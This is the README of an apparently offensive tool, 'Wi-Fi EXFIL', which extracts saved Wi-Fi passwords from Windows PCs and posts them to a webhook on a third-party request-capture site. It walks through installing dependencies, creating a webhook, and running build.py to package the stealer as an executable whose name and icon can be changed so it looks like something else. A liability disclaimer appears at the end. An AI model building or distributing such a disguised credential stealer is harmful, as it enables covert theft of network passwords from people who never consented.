# Wi-Fi EXFIL

Exfiltrate stored Wi-Fi passwords from a Windows PC.

## Requirements

1. On your Windows machine install Python from <https://www.python.org/downloads/>.

2. Install pyinstaller, run `pip install pyinstaller` from cmd.

3. Create a webhook from one of the following sites:

- <https://requestinspector.com>
- <https://beeceptor.com>
- <https://webhook.site>

## Usage

First clone or download repo as ZIP. Then select between [build](#build) or [test](#test) mode.

### Build

Create basic executable:

```shell
python3 build.py <webhook_url>
```

Create executable with custom name or icon:

```shell
python3 build.py -n <name> -i <icon_file> <webhook_url>
```

Executable will be placed inside the **dist** directory. Run it and results will appear in the webhook.

### Test

> :warning: This mode is designed for running scripts directly from Python without needing any executable.

```shell
python3 test.py <webhook_url>
```

## Disclaimer

Usage of these scripts for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.

## Credits

[Original script](https://github.com/thegoodhackertv/wifiExfil) provided by [Andrés Moreno](https://github.com/thegoodhackertv).

[<img width=300 alt="patreon" src="https://i0.wp.com/thegoodhackertv.com/wp-content/uploads/2020/11/patreon.png">](https://www.patreon.com/thegoodhacker)

[<img width=250 alt="buymeacoffe" src="https://cdn.buymeacoffee.com/buttons/v2/default-orange.png">](https://www.buymeacoffee.com/thegoodhacker)

<!-- ¡Un saludo desde México Andrés! -->
